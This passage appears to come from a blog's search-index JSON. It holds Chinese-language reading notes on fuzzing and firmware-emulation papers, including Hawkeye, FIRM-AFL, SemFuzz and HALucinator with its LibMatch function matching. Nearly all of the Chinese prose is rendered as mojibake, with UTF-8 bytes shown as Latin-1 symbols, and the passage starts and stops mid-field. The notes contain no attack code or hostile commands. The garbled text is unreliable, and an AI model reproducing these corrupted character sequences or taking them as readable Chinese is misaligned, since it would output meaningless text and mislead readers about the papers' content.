çš„fuzzå¯¹è±¡æ˜¯é©±åŠ¨ï¼Œä½œè€…è®¤ä¸ºä¸éœ€è¦è®¾å¤‡çš„é©±åŠ¨fuzzå…³é”®åœ¨äºé€šè¿‡é©±åŠ¨çš„éªŒè¯é“¾ [[Hawkeyeï¼š Towards a Desired Directed Grey-box Fuzzer]]\nç»å…¸è®ºæ–‡ ä½œè€…åšåˆ° æœ‰æ•ˆçš„è®¡ç®—è·ç¦»ï¼Œå› ä¸ºè®¡ç®—æ–¹æ³•çš„é—®é¢˜ï¼Œå¯èƒ½è®¡ç®—å‡ºæ¥çš„æœ€çŸ­è·ç¦»å¹¶ä¸æ˜¯å®é™…ä¸Šçš„æœ€çŸ­è·ç¦»ï¼ˆAFLGOçš„é—®é¢˜ï¼‰ï¼›ä¸è€ƒè™‘æ‰€æœ‰çš„è·¯å¾„å¯èƒ½ä¼šæ¼æ‰éšè—åœ¨è¾ƒé•¿è·¯å¾„æ·±å¤„çš„é”™è¯¯ è®¡ç®—è·ç¦»çš„æ—¶å€™è€ƒè™‘äº†è¢«è°ƒç”¨å‡½æ•°çš„è¢«è°ƒç”¨æ¦‚ç‡ï¼Œæ¦‚ç‡è¶Šå¤§è¶Šè¿‘ åˆ†ä¸ºä¸¤ç§å‡½æ•°çº§è·ç¦»å’ŒåŸºæœ¬å—çº§è·ç¦»ï¼ˆä¸¤ç§è®¡ç®—æ–¹å¼ç”¨äºèƒ½é‡è°ƒåº¦ï¼‰ å‡å°é™æ€åˆ†æçš„å¼€é”€ å¯¹æ•´ä¸ªç¨‹åºçš„å‡½æ•°æŒ‡é’ˆåº”ç”¨åŸºäºåŒ…å«çš„æŒ‡é’ˆåˆ†æ å¦‚ä½•é«˜æ•ˆèƒ½é‡åˆ†é… è®¡ç®—åŸºæœ¬å—è·Ÿè¸ªè·ç¦»å’Œè¦†ç›–å‡½æ•°ç›¸ä¼¼åº¦ï¼ŒåŸºäºè¿™ä¸¤ä¸ªå€¼æ¥ç¡®å®šç§å­ä¼˜å…ˆçº§ å¦‚ä½•åŠ¨æ€è°ƒæ•´å˜å¼‚ç­–ç•¥ é€‚åº”æ€§çªå˜ [[FIRM-AFL_ High-Throughput Greybox Fuzzing of IoT Firmware via Augmented Process Emulation]]\næœ¬æ–‡çš„ç‚¹åœ¨å°†å›ºä»¶çš„å†…å­˜æ˜ å°„åˆ°ç³»ç»Ÿå†…å­˜ï¼Œå¢åŠ äº†fuzzçš„é€Ÿåº¦ï¼ˆæ–‡ä¸­ç§°ä¹‹ä¸ºååé‡ï¼‰ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/fuzz%E6%95%B4%E7%90%86/","summary":"#TODO [[SemFuzz Semantics-based Automatic Generation of Proof-of-Concept Exploits]] å˜å¼‚ç­–ç•¥åˆ†ä¸ºç²—ç»†ç²’åº¦ ç²—ç²’åº¦ï¼šå°†æ¯æ¬¡çš„è¾“å…¥ç§°ä¹‹ä¸ºæ¨¡ç³Šå®ä¾‹ï¼Œæµ‹é‡æ¨¡ç³Šå®ä¾‹å’Œè„†å¼±å‡½æ•°ä¹‹é—´çš„è·ç¦»ï¼ˆè·ç¦»æ˜¯ä¸¤è€…ä¹‹é—´æœ€çŸ­è·¯å¾„çš„èŠ‚ç‚¹æ•°ï¼‰ï¼Œ","title":"fuzzæ•´ç†"},{"content":"ä¸­æ–‡è¯‘åï¼šHALucinator: é€šè¿‡æŠ½è±¡å±‚ä»¿çœŸé‡æ–°æ‰˜ç®¡å›ºä»¶ ä½œè€…ï¼šAbraham A. Clements å•ä½ï¼šæ¡‘è¿ªäºšå›½å®¶å®éªŒå®¤ å›½å®¶ï¼š #ç¾å›½ å¹´ä»½ï¼š #2020å¹´ æ¥æºï¼š #USENIXä¼šè®® å…³é”®å­—ï¼š #å›ºä»¶ #ä»¿çœŸæ‰˜ç®¡ ä»£ç åœ°å€ï¼š ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-03-04 10:29\næ‘˜è¦ èƒŒæ™¯ï¼šç¡¬ä»¶å’Œå›ºä»¶ä¹‹é—´çš„ç´§å¯†è€¦åˆä»¥åŠåµŒå…¥å¼ç³»ç»Ÿä¸­çš„å¤šæ ·æ€§ä½¿å¾—å¯¹å›ºä»¶è¿›è¡ŒåŠ¨æ€åˆ†æå˜å¾—å›°éš¾ã€‚ ç°çŠ¶ï¼šå›ºä»¶å¼€å‘äººå‘˜ç»å¸¸ä½¿ç”¨æŠ½è±¡ï¼Œå¦‚ç¡¬ä»¶æŠ½è±¡å±‚ï¼ˆHALï¼‰ï¼Œæ¥ç®€åŒ–ä»–ä»¬çš„å·¥ä½œã€‚ æ–¹æ³•ï¼šåˆ©ç”¨è¿™äº›æŠ½è±¡ä½œä¸ºé‡æ–°æ‰˜ç®¡å’Œåˆ†æå›ºä»¶çš„åŸºç¡€ã€‚é€šè¿‡ä¸º HAL å‡½æ•°æä¾›é«˜çº§æ›¿ä»£ï¼ˆä¸€ä¸ªç§°ä¸ºé«˜çº§æ¨¡æ‹Ÿ - HLE çš„è¿‡ç¨‹ï¼‰ï¼Œå°†ç¡¬ä»¶å’Œå›ºä»¶åˆ†ç¦»ã€‚é¦–å…ˆé€šè¿‡äºŒè¿›åˆ¶åˆ†æå®šä½å›ºä»¶æ ·æœ¬ä¸­çš„åº“å‡½æ•°ï¼Œç„¶ååœ¨å…¨ç³»ç»Ÿæ¨¡æ‹Ÿå™¨ä¸­æä¾›è¿™äº›å‡½æ•°çš„é€šç”¨å®ç°ã€‚ å·¥ä½œï¼šå¯¹ç°æœ‰åº“åŒ¹é…æŠ€æœ¯è¿›è¡Œæ‰©å±•ï¼Œå¯ä»¥è¯†åˆ«äºŒè¿›åˆ¶å›ºä»¶ä¸­çš„åº“å‡½æ•°ï¼›ä½¿ç”¨ç®€åŒ–å¤„ç†ç¨‹åºå–å¤–è®¾æ¨¡å‹æ¥è¿›è¡Œ re-hostingï¼›é›†æˆåˆ° AFL æ¥æ¼”ç¤ºå®‰å…¨åˆ†ææ–¹é¢çš„åº”ç”¨\n1å¼•è¨€ èƒŒæ™¯ï¼š å›ºä»¶åŠ¨æ€åˆ†æéš¾\nå›ºä»¶æœ‰ç¡¬ä»¶ä¾èµ–æ€§ï¼Œä¼ ç»Ÿçš„æ‰‹æ®µä¸å¥½å®æ–½ åµŒå…¥å¼ç¡¬ä»¶æä¾›æœ‰é™çš„å†…çœèƒ½åŠ›ï¼ŒåŒ…æ‹¬æå…¶æœ‰é™æ•°é‡çš„æ–­ç‚¹å’Œç›‘è§†ç‚¹ï¼Œå¤§å¤§é™åˆ¶äº†å¯¹å›ºä»¶è¿›è¡ŒåŠ¨æ€åˆ†æçš„èƒ½åŠ›ã€‚ æ²¡æœ‰æºä»£ç ï¼Œå¹¶ä¸”å›ºä»¶éš¾ä»¥è·å¾—ï¼Œå³ä½¿å¾—åˆ°å›ºä»¶ä¹Ÿéš¾ä»¥å¤„ç†å¤æ‚çš„ç¯å¢ƒä¾èµ– æ¨¡æ‹Ÿå…·æœ‰å±€é™æ€§ï¼š\nåµŒå…¥å¼ç¡¬ä»¶ä¸­çš„å¼‚æ„æ€§å¯¹å›ºä»¶æ¨¡æ‹Ÿæ„æˆäº†é‡å¤§éšœç¢ï¼Œæ¨¡æ‹Ÿéœ€è¦å¯¹ç‰‡ä¸Šå¤–è®¾å’Œå†…å­˜å¸ƒå±€ä»¥ä¸“é—¨æ–¹å¼æ”¯æŒ æµè¡Œçš„å¼€æº QEMU æ¨¡æ‹Ÿå™¨æ”¯æŒä¸åˆ° 30 ç§ ARM è®¾å¤‡ è‹±ç‰¹å°”çš„ SIMICS [38, 57]æ”¯æŒè®¸å¤š CPU å’Œå¤–è®¾ï¼Œä½†è¦æ±‚åˆ†æå¸ˆæ‰‹åŠ¨æ„å»ºç¡¬ä»¶çº§åˆ«çš„å®Œæ•´ç³»ç»Ÿæ¨¡å‹ã€‚ å¤§å¤šæ•°åµŒå…¥å¼ç³»ç»Ÿè¿˜éœ€è¦å…¶ä»–ç¡¬ä»¶ç»„ä»¶æ‰å¯èƒ½ä½¿å›ºä»¶è¿è¡Œï¼ˆå¦‚ä¼ æ„Ÿå™¨ã€å­˜å‚¨è®¾å¤‡æˆ–ç½‘ç»œç»„ä»¶ï¼‰ï¼Œç„¶è€Œè¿™äº›å¤–è®¾å‡ ä¹æ²¡æœ‰æ¨¡æ‹Ÿæ”¯æŒ ç°çŠ¶ï¼š\næ¨¡æ‹Ÿå™¨å°†å›ºä»¶ä¸ä¸å—æ”¯æŒçš„å¤–è®¾çš„äº¤äº’è½¬å‘çš„çœŸå®è®¾å¤‡ä¸Š å—ç¡¬ä»¶å¯ç”¨çš„é™åˆ¶ åˆ†æå’Œæ’æ¡©å—é™ è®°å½•å¹¶é‡æ”¾æˆ–å»ºæ¨¡æ¥è‡ªç¡¬ä»¶çš„æ•°æ® ä¸Šè¿°é—®é¢˜åŒæ ·å›°æ‰°å›ºä»¶å¼€å‘äººå‘˜ èŠ¯ç‰‡ä¾›åº”å•†å’Œå„ç§ç¬¬ä¸‰æ–¹æä¾›äº†ç¡¬ä»¶æŠ½è±¡å±‚ HALã€‚HAL æ˜¯è½¯ä»¶åº“ï¼Œä¸ºç¨‹åºå‘˜æä¾›é«˜çº§ç¡¬ä»¶æ“ä½œï¼ŒåŒæ—¶éšè—å›ºä»¶æ‰§è¡Œæ‰€åœ¨ç‰¹å®šèŠ¯ç‰‡æˆ–ç³»ç»Ÿçš„ç»†èŠ‚ã€‚ æ–¹æ³•ï¼š é€šè¿‡ä½¿ç”¨é«˜çº§æŠ½è±¡å±‚å’Œå¯é‡ç”¨çš„æ›¿æ¢åŠŸèƒ½æ¥å®ç°åµŒå…¥å¼ç³»ç»Ÿçš„å¯æ‰©å±•æ¨¡æ‹Ÿï¼Œç§°ä¸ºé«˜çº§æ¨¡æ‹Ÿ (HLE)\né¦–å…ˆè¯†åˆ«å›ºä»¶æ˜ åƒä¸­è´Ÿè´£ç¡¬ä»¶äº¤äº’çš„ HAL å‡½æ•° ç„¶å HLE æä¾›ç®€å•çš„ã€åˆ†æå¸ˆåˆ›å»ºçš„é«˜çº§æ›¿æ¢ï¼ˆç§°ä¹‹ä¸ºå¤„ç†ç¨‹åºï¼‰æ›¿æ¢ HAL å‡½æ•°ï¼Œ è¿™ç§æ›¿æ¢å¯ä»¥æ‰©å±•åˆ°æ¥è‡ªåŒä¸€ä¾›åº”å•†çš„èŠ¯ç‰‡ï¼Œç”šè‡³æ‰©å±•åˆ°ä½¿ç”¨ç›¸åŒä¸­é—´ä»¶åº“çš„å›ºä»¶ è¿™äº›å¤„ç†ç¨‹åºå¯ä»¥ä½¿ç”¨å¤–è®¾æ¨¡å‹ï¼Œå®ƒä»¬ä½œä¸ºç¡¬ä»¶å¤–è®¾é€šç”¨ç±»åˆ«çš„æŠ½è±¡ï¼Œå¹¶åœ¨æ¨¡æ‹Ÿç¯å¢ƒå’Œä¸»æœºç¯å¢ƒä¹‹é—´ä½œä¸ºäº¤äº’ç‚¹ï¼Œè€Œæ— éœ€å¤æ‚é€»è¾‘ã€‚ è´¡çŒ®ï¼š\nåœ¨ QEMU çš„åŸºç¡€ä¸Šåˆ©ç”¨ HAL å®ç°äº†ä¸€ä¸ªé«˜çº§æ¨¡æ‹Ÿç³»ç»Ÿ HALucinator æ”¯æŒå¤šä¸ªèŠ¯ç‰‡ä¾›åº”å•†çš„ ARM Cortex-M æ¶æ„çš„ blob å›ºä»¶ æ”¹è¿›äº†ç°æœ‰çš„åº“åŒ¹é…æŠ€æœ¯ï¼Œä»¥æ›´å¥½åœ°å®šä½å›ºä»¶ä¸­ç”¨äºæ‹¦æˆªçš„å‡½æ•° åˆ©ç”¨ HALucinator è¿›è¡Œå›ºä»¶çš„æ¨¡ç³Šæµ‹è¯•ï¼Œæ•ˆæœè‰¯å¥½ 2åŠ¨æœº é‰´äºç›®å‰å¸‚åœºä¸Šçš„è¶‹åŠ¿ï¼Œä½œè€…é¢„è®¡æœªæ¥å›ºä»¶ä¸­å°†æ™®éé‡‡ç”¨ HALã€‚\n2.1 æ¨¡æ‹Ÿç¡¬ä»¶å’Œå¤–è®¾ ç‰‡ä¸Šå¤–è®¾å¯ä»¥é€šè¿‡æ¨¡æ‹Ÿå†…å­˜æ˜ å°„ I/Oï¼ˆMMIOï¼‰æ¥å®ç°ï¼Œå› ä¸ºåœ¨èŠ¯ç‰‡æ–‡æ¡£ä¸­å¯¹æ¯ä¸ªå¤–è®¾çš„ MMIO åŒºåŸŸçš„ç¡®åˆ‡å¸ƒå±€å’Œè¯­ä¹‰æœ‰æè¿° è¿›ä¸€æ­¥å¤æ‚åŒ–é‡æ–°æ‰˜ç®¡çš„æ˜¯å›ºä»¶ä¸ç‰‡å¤–è®¾å¤‡ï¼ˆä¾‹å¦‚ä¼ æ„Ÿå™¨ã€æ‰§è¡Œå™¨ã€å¤–éƒ¨å­˜å‚¨è®¾å¤‡æˆ–é€šä¿¡ç¡¬ä»¶ï¼‰ä¹‹é—´çš„äº¤äº’ã€‚ è¿™ç§å¤–è®¾æ¶‰åŠåˆ°å®šåˆ¶åŒ–çš„ç”µè·¯æ¿ï¼Œæ‰€ä»¥æ¯ä¸ªå›ºä»¶æ ·æœ¬çš„å®Œæ•´æ‰§è¡Œç¯å¢ƒåŸºæœ¬ä¸Šéƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ æƒ³è¦ä½¿ç”¨ç°æœ‰çš„ä»¿çœŸå·¥å…·è¿›è¡Œæ¨¡æ‹Ÿï¼Œå°±å¿…é¡»å®ç°ç¬¦åˆå›ºä»¶ä½¿ç”¨ MMIO å¯„å­˜å™¨æ¥å£è§„èŒƒçš„ç‰‡ä¸Šå’Œç‰‡å¤–è®¾å¤‡çš„æ¨¡æ‹Ÿã€‚\n2.2 å›ºä»¶æ ˆ å›¾ 2a å±•ç¤ºäº†ä¸€ä¸ªé€šè¿‡ http æœåŠ¡å™¨è·å–æ¸©åº¦çš„è½¯ç¡¬ä»¶å †æ ˆã€‚é¦–å…ˆ http server çš„æŸä¸ªåº”ç”¨ç¨‹åºè°ƒç”¨æ¸©åº¦ä¼ æ„Ÿå™¨åˆ¶é€ å•†æä¾›çš„åº“ä¸­çš„ API æ¥è·å–æ¸©åº¦ï¼Œè¯¥åº“å‘ä¸‹åˆè°ƒç”¨å¾®æ§åˆ¶å™¨åˆ¶é€ å•†æä¾›çš„ I2C HAL é€šè¿‡ I2C æ€»çº¿ä¸æ¸©åº¦ä¼ æ„Ÿå™¨é€šä¿¡è·å¾—æ¸©åº¦ä¿¡æ¯ã€‚Http server å¾—åˆ°æ¸©åº¦åï¼Œè°ƒç”¨ OS åº“çš„ API å‘é€å’Œæ¥æ”¶ TCP ä¿¡æ¯ï¼ŒOS ä½¿ç”¨ LWIP åº“è¿›è¡Œ tcp æŠ¥æ–‡çš„å°è£…ï¼ŒLWIP åº“ä½¿ç”¨ä»¥å¤ªç½‘ HAL é€šè¿‡ç‰©ç†ä»¥å¤ªç½‘ç«¯å£å‘é€ä»¥å¤ªç½‘å¸§ã€‚ è¿™ä¸ªä¾‹å­è¡¨ç¤ºï¼Œç°ä»£è®¾å¤‡çš„å¤æ‚æ€§å’Œå‡å°‘å¼€å‘æ—¶é—´çš„å‹åŠ›è¶Šæ¥è¶Šä½¿å¾—å›ºä»¶ä¸­çš„åŠŸèƒ½å»ºç«‹åœ¨ä¸€ç³»åˆ—ä¸­é—´ä»¶åº“å’Œ HAL ä¹‹ä¸Šã€‚è¿™æ ·å®ç°äº†åº”ç”¨ç¨‹åºå’Œç‰©ç†ç¡¬ä»¶çš„åˆ†ç¦»ã€‚ä¸ºäº†è®© HALucinator æ‰“ç ´å›ºä»¶ä¸ç¡¬ä»¶ä¹‹é—´çš„è€¦åˆï¼Œå®ƒå¿…é¡»æ‹¦æˆªå…¶ä¸­ä¸€ä¸ªå±‚æ¬¡â€”â€”ä¸­é—´ä»¶/åº“æˆ– HALâ€”â€”å¹¶æ’å…¥å…¶æ›¿ä»£åŠŸèƒ½ã€‚ æ‰€ä»¥é€‰æ‹©åœ¨å“ªä¸ªå±‚æ¬¡è¿›è¡Œæ›¿æ¢éœ€è¦æƒè¡¡é«˜çº§æ›¿æ¢çš„é€šç”¨æ€§å’Œå¯é‡ç”¨æ€§ã€ä»£ç é‡ä»¥åŠåœ¨ç›®æ ‡è®¾å¤‡å›ºä»¶ä¸­æ‰¾åˆ°ç»™å®šåº“çš„å¯èƒ½æ€§ã€‚ ä½œè€…å¯ä»¥ç¡®å®šå›ºä»¶å¼€å‘è€…æ›´æœ‰å¯èƒ½ä½¿ç”¨èŠ¯ç‰‡ä¾›åº”å•†çš„ HALï¼Œè€Œå¯¹äºæ›´é«˜å±‚æ¬¡ï¼ˆå¦‚ç½‘ç»œå †æ ˆæˆ–ä¸­é—´ä»¶ï¼‰ï¼Œæ— æ³•é¢„æµ‹å¼€å‘è€…ç”¨äº†ä»€ä¹ˆåº“ã€‚æ‰€ä»¥ä½œè€…ä¸»è¦å…³æ³¨åœ¨ HAL å±‚æ¬¡ä¸Šé‡æ–°æ‰˜ç®¡ã€‚ ä½†æ˜¯ä½œè€…ä¹ŸæŒ‡å‡º HAL å±‚å…·æœ‰æœ€å¤šçš„å‡½æ•°ï¼Œå¹¶ä¸”ä¸ç¡¬ä»¶äº§ç”Ÿå¤æ‚çš„äº¤äº’ï¼ˆä¸­æ–­å’Œ DMAï¼‰ï¼Œè€Œå›´ç»•é«˜å±‚æ¬¡çš„åº“æ„å»ºçš„å¤„ç†ç¨‹åºå¯ä»¥æ›´ç®€å•ï¼Œæ›´å®¹æ˜“åœ¨è®¾å¤‡é—´ç§»æ¤ã€‚\n2.3 é«˜çº§ä»¿çœŸ ä½œè€…çš„æ–¹æ³•å‡å°‘äº†æ¨¡æ‹Ÿçš„å·¥ä½œé‡ï¼Œæ¨¡æ‹Ÿå·¥ä½œé‡éšç€ HAL æˆ–ä¸­é—´ä»¶åº“æ•°é‡å¢åŠ è€Œå¢é•¿å¾—æ›´æ…¢ã€‚ é«˜çº§æ¨¡æ‹Ÿæ¶ˆé™¤äº†ç†è§£ç¡¬ä»¶ä½çº§ç»†èŠ‚çš„è¦æ±‚ã€‚å› æ­¤ï¼Œå¤„ç†ç¨‹åºä¸éœ€è¦å®ç°ä½çº§ MMIO æ“ä½œï¼Œè€Œåªéœ€æˆªè·ç›¸åº”çš„ HAL å‡½æ•°ï¼Œå°†æ‰€éœ€å‚æ•°ä¼ é€’ç»™é€‚å½“çš„å¤–è®¾æ¨¡å‹å¹¶è¿”å›å›ºä»¶æœŸæœ›çš„å€¼å³å¯ã€‚ å¯¹äºåˆ†ææ—¶ä¸å…³å¿ƒæˆ–è€…ä¸å¿…è¦çš„å¤–è®¾ï¼Œä½œè€…çš„æ–¹æ³•ä¹Ÿå…è®¸ä½¿ç”¨ç®€å•ä½ä¿çœŸåº¦å¤„ç†ç¨‹åºç»•è¿‡è¯¥å‡½æ•°å¹¶è¿”å›æŒ‡ç¤ºæˆåŠŸæ‰§è¡Œçš„å€¼ 3 è®¾è®¡ ä¸ºäº†è®©æˆ‘ä»¬çš„è®¾è®¡å……åˆ†åˆ©ç”¨é«˜å±‚æ¨¡æ‹Ÿçš„ä¼˜åŠ¿ï¼Œæˆ‘ä»¬éœ€è¦ï¼ˆ1ï¼‰åœ¨å›ºä»¶ä¸­æ‰¾åˆ°HALåº“å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡åº“åŒ¹é…ï¼‰ï¼Œï¼ˆ2ï¼‰ä¸ºHALå‡½æ•°æä¾›é«˜å±‚æ›¿ä»£å“ï¼Œå¹¶ä¸”ï¼ˆ3ï¼‰å¯ç”¨ä¸æ¨¡æ‹Ÿå›ºä»¶çš„å¤–éƒ¨äº¤äº’ã€‚ HALucinatoré‡‡ç”¨æ¨¡å—åŒ–è®¾è®¡ï¼Œä»¥ä¾¿äºå…¶ä¸å„ç§å›ºä»¶å’Œåˆ†ææƒ…å†µä¸€èµ·ä½¿ç”¨ï¼Œå¦‚å›¾1æ‰€ç¤ºã€‚ ä¸ºäº†ä»‹ç»HALucinatorçš„å„ä¸ªé˜¶æ®µå’Œç»„æˆéƒ¨åˆ†ï¼Œè®©æˆ‘ä»¬è€ƒè™‘ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹å›ºä»¶ï¼Œå®ƒä½¿ç”¨ä¸²è¡Œç«¯å£å°†æ¥è‡ªè¿æ¥è®¡ç®—æœºçš„å­—ç¬¦å›æ˜¾ã€‚ é™¤äº†ç¡¬ä»¶åˆå§‹åŒ–ä»£ç å¤–ï¼Œæ­¤å›ºä»¶ä»…éœ€è¦å‘é€å’Œæ¥æ”¶ä¸²è¡Œæ•°æ®çš„èƒ½åŠ›ã€‚ åˆ†æå¸ˆæ³¨æ„åˆ°è®¾å¤‡çš„CPUæ˜¯STM32F4å¾®æ§åˆ¶å™¨ï¼Œå¹¶ä½¿ç”¨ç¬¬3.2èŠ‚ä¸­ä»‹ç»çš„LibMatchåˆ†æï¼Œå¹¶ä¸ºSTMicroelectricsâ€™ HALåº“æ„å»ºæ•°æ®åº“ä»¥ç”¨äºæ­¤èŠ¯ç‰‡ç³»åˆ—ã€‚ è¿™ç¡®å®šäº†äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„HAL_UART_Receiveå’ŒHAL_UART_Transmitã€‚ ç„¶åï¼Œåˆ†æå¸ˆä¸ºHALucinatoråˆ›å»ºé…ç½®ï¼ŒæŒ‡ç¤ºåº”ä½¿ç”¨ä¸€ç»„å¤„ç†ç¨‹åºï¼ˆå³é«˜çº§åŠŸèƒ½æ›¿æ¢ï¼‰æ¥å¤„ç†åŒ…å«çš„HALã€‚ å¦‚æœå¤„ç†ç¨‹åºå°šä¸å­˜åœ¨ï¼Œåˆ™ç”±åˆ†æå¸ˆåˆ›å»ºå®ƒä»¬ã€‚ è¿™ä¸¤ä¸ªHALå‡½æ•°å°†ä¸²è¡Œç«¯å£å¼•ç”¨ã€ç¼“å†²åŒºæŒ‡é’ˆå’Œé•¿åº¦ä½œä¸ºå‚æ•°ä¼ é€’ã€‚ ä¸ºäº†èŠ‚çœç²¾åŠ›ï¼Œè¿™äº›å¤„ç†ç¨‹åºåªéœ€å°†è¿™äº›å‚æ•°è½¬æ¢æˆå¯ç”±ä¸²è¡Œç«¯å£å¤–è®¾æ¨¡å‹ä½¿ç”¨çš„å½¢å¼ï¼ˆä¾‹å¦‚è¦å‘é€æˆ–æ¥æ”¶çš„åŸå§‹æ•°æ®ï¼‰ã€‚ æœ€åï¼ŒI/OæœåŠ¡å™¨åœ¨ä¸²è¡Œç«¯å£å¤–è®¾æ¨¡å‹å’Œä¸»æœºè®¡ç®—æœºç»ˆç«¯ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚ ç°åœ¨ï¼Œåœ¨HALucinatorä¸­æ‰§è¡Œå›ºä»¶æ—¶ï¼Œå¯ä»¥åƒä»»ä½•å…¶ä»–æ§åˆ¶å°ç¨‹åºä¸€æ ·é€šè¿‡ç»ˆç«¯ä½¿ç”¨å›ºä»¶ã€‚ è¿™åªä»£è¡¨äº†HALucinatorèƒ½åŠ›çš„ä¸€å°éƒ¨åˆ†ï¼Œåœ¨ä»¥ä¸‹å„èŠ‚ä¸­æˆ‘ä»¬å°†è¯¦ç»†æ¢è®¨ã€‚\n3.1 å…ˆå†³æ¡ä»¶ éœ€è¦è®¾å¤‡çš„å®Œæ•´å›ºä»¶ æƒ³è¦æ¨¡æ‹Ÿçš„åº“å’Œç¼–è¯‘å·¥å…·é“¾ ä¸€ä¸ªèƒ½å¤Ÿå¿ å®æ‰§è¡Œå›ºä»¶ä»£ç å¹¶èƒ½å¤Ÿæ”¯æŒ HALucinator çš„ä»ªå™¨çš„åº•å±‚æ¨¡æ‹Ÿå™¨ å¯é…ç½®çš„å†…å­˜å¸ƒå±€ èƒ½æŒ‚é’©ä»£ç ä¸­çš„ç‰¹å®šåœ°å€ä»¥è§¦å‘é«˜çº§å¤„ç†ç¨‹åº è®¿é—®æ¨¡æ‹Ÿå™¨çš„å¯„å­˜å™¨å’Œå†…å­˜ è™½ç„¶è¿™çœ‹èµ·æ¥æ˜¯ä¸€é•¿ä¸²è¦æ±‚ï¼Œä½†å®é™…ä¸Šè·å¾—å®ƒä»¬å¾ˆç®€å•ã€‚å¯¹äºæˆ‘ä»¬åœ¨æœ¬å·¥ä½œä¸­å…³æ³¨çš„ ARM Cortex-M è®¾å¤‡ï¼Œé€šç”¨å†…å­˜æ˜ å°„å·²æ ‡å‡†åŒ–å¹¶å¯ä»ä¾›åº”å•†æä¾›çš„æ‰‹å†Œä¸­è½»æ¾è·å¾—ï¼Œå›ºä»¶åœ¨å†…å­˜ä¸­çš„ä½ç½®å¯ä»¥ä»å›ºä»¶ blob æœ¬èº«è¯»å–ï¼Œå¹¶ä¸”å¸¸è§æ¨¡æ‹Ÿå™¨ï¼ˆä¾‹å¦‚ QEMU [18]ï¼‰å¿ å®åœ°æ¨¡æ‹ŸæŒ‡ä»¤ã€‚æ¯ä¸ª Cortex-M ä¾›åº”å•†éƒ½ä¸ºå…¶èŠ¯ç‰‡æä¾›å¼€æº HALï¼ˆsï¼‰ï¼Œå¸¦æœ‰ç¼–è¯‘å™¨å’Œé…ç½®[16ã€34ã€42ã€53]ã€‚ä¸ºäº†å°† HALucinator åº”ç”¨äºç‰¹å®šè®¾å¤‡ï¼Œæ‰€éœ€çš„åªæ˜¯è·å–å›ºä»¶ï¼ŒçŸ¥é“ CPU çš„ä¾›åº”å•†å¹¶è·å–å…¶ SDKã€‚\n3.2 libmatch ç›®çš„ï¼šHigh level emulation çš„ä¸€ä¸ªå…³é”®éƒ¨åˆ†å°±æ˜¯éœ€è¦åœ¨ç¨‹åºä¸­å®šä½å¯ä»¥ç”¨ä½œæ¨¡æ‹ŸåŸºç¡€çš„æŠ½è±¡ ç°çŠ¶ï¼š ç°æœ‰è§£å†³åœ¨å‰¥ç¦»äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾å‡½æ•°é—®é¢˜çš„æ–¹æ³•[24ã€33ã€35]ç¼ºä¹å¯¹åµŒå…¥å¼ CPU æ¶æ„ï¼ˆå°¤å…¶æ˜¯ ARM Cortex-M æ¶æ„ï¼‰çš„æ”¯æŒï¼Œè¯¥æ¶æ„å¸¸ç”¨äºè®¸å¤šæ¶ˆè´¹çº§åˆ«çš„è®¾å¤‡å¹¶ä¸”åœ¨æœ¬å·¥ä½œä¸­ä½¿ç”¨ã€‚ å›ºä»¶åº“å‡½æ•°é€šå¸¸ä¼šå¯¹å¤§å°è¿›è¡Œä¼˜åŒ–ï¼Œå¯¼è‡´ä¸¤ä¸ªå‡ ä¹ç›¸åŒçš„ä»£ç å´ç”¨äºæˆªç„¶ä¸åŒçš„ç›®çš„ å›ºä»¶åº“å‡½æ•°çš„ä¸€ä¸ªä¸å¯»å¸¸ç‰¹å¾æ˜¯å®ƒä»¬ç»å¸¸è°ƒç”¨éåº“éƒ¨åˆ†ä»£ç ä¸­çš„å‡½æ•° æ„æ€æ˜¯æœ‰ä¸€éƒ¨åˆ†å›ºä»¶åº“å‡½æ•°çš„å‚æ•°æ˜¯å‡½æ•°æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯å›è°ƒå‡½æ•°ï¼Œæ‰€ä»¥ä¸ºäº†æä¾›å®Œå…¨å·¥ä½œçš„å¤„ç†ç¨‹åºï¼Œæˆ‘ä»¬ä¸ä»…å¿…é¡»æ¢å¤åº“å‡½æ•°åç§°å’Œåœ°å€ï¼Œè¿˜å¿…é¡»æ¢å¤å®ƒä»¬è°ƒç”¨åº”ç”¨ç¨‹åºä»£ç çš„åç§°å’Œåœ°å€ã€‚ æ–¹æ³•ï¼šlibmatchï¼Œåˆ©ç”¨ç¨‹åºä¸­å‡½æ•°çš„ä¸Šä¸‹æ–‡æ¥å¸®åŠ©äºŒè¿›åˆ¶åˆ°åº“åŒ¹é… é€šè¿‡æå–åº“çš„æœªé“¾æ¥äºŒè¿›åˆ¶å¯¹è±¡æ–‡ä»¶çš„æ§åˆ¶æµå›¾ä»¥åŠå®ƒä»¬ä»£ç çš„ä¸­é—´è¡¨ç¤ºï¼ˆIRï¼‰æ¥åˆ›å»º HAL å‡½æ•°åŒ¹é…æ•°æ®åº“ ç„¶ååŸºäºä»¥ä¸‹å‡ ä¸ªåŸåˆ™è¿›è¡ŒåŒ¹é…ï¼š ç»Ÿè®¡æ¯”è¾ƒï¼šæ¯”è¾ƒç›®æ ‡ç¨‹åºå’Œæ•°æ®åº“ä¸­åº“å‡½æ•°çš„åŸºæœ¬å—æ•°é‡ã€CFG è¾¹å’Œå‡½æ•°è°ƒç”¨ åŸºæœ¬å—æ¯”è¾ƒï¼šå¦‚æœä¸¤ä¸ªå‡½æ•°çš„æ¯ä¸ªåŸºæœ¬å—çš„ IR å†…å®¹å®Œå…¨åŒ¹é…ï¼Œæˆ‘ä»¬è®¤ä¸ºå®ƒä»¬åŒ¹é…ã€‚ ä¸Šä¸‹æ–‡åŒ¹é…ï¼šå‰ä¸€æ­¥å¯ä»¥è¾“å‡ºä¸€ç»„åŒ¹é…ï¼Œä½†æ˜¯ä¹Ÿä¼šè¾“å‡ºé‚£äº›æ²¡æœ‰åŒ¹é…æˆåŠŸçš„å‡½æ•°ï¼Œé‚£ä¹ˆåˆ©ç”¨ç›®æ 